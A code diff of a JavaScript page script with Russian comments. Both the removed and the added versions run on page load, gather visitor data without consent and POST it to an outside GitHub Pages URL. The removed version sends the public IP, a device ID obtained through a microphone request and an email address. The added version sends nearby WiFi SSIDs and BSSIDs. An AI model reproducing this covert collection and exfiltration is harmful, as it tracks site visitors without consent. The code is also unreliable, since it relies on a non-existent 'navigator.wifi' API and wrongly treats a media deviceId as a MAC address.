@@ -1,46 +1,32 @@
-// Функция для получения IP-адреса
-async function getIpAddress() {
-  const response = await fetch('https://api.ipify.org?format=json');
-  const data = await response.json();
-  return data.ip;
-}
-
-// Функция для получения MAC-адреса
-async function getMacAddress() {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    return null;
+(async function () {
+  // Проверка поддержки API WiFi
+  if (!navigator.wifi) {
+    console.log("API WiFi не поддерживается");
+    return;
   }
 
-  const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-  const tracks = stream.getTracks();
-  const settings = tracks[0].getSettings();
-  return settings.deviceId;
-}
+  // Запрос разрешения на доступ к WiFi
+  try {
+    const networks = await navigator.wifi.getNetworks();
 
-// Функция для отправки уведомления
-async function sendNotification(email, ipAddress, macAddress) {
-  const data = {
-    email,
-    ipAddress,
-    macAddress,
-  };
+    // Получение SSIDs и BSSIDs доступных WiFi-сетей
+    const ssids = networks.map((network) => network.ssid);
+    const bssids = networks.map((network) => network.bssid);
 
-  const options = {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(data),
-  };
+    // **Замените этот URL на ваш серверный API**
+    await fetch("https://osip-d25.github.io/filetest/", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        ssids,
+        bssids,
+      }),
+    });
 
-  await fetch('https://osip-d25.github.io/filetest/', options);
-}
-
-// Обработчик события загрузки страницы
-window.addEventListener('load', async () => {
-  const email = 'smij86683@gmail.com'; // Задайте адрес электронной почты
-  const ipAddress = await getIpAddress();
-  const macAddress = await getMacAddress();
-
-  await sendNotification(email, ipAddress, macAddress);
-});
+    console.log("Данные о WiFi-сетях пользователя успешно отправлены");
+  } catch (error) {
+    console.log(`Ошибка при получении информации о WiFi: ${error.message}`);
+  }
+})();
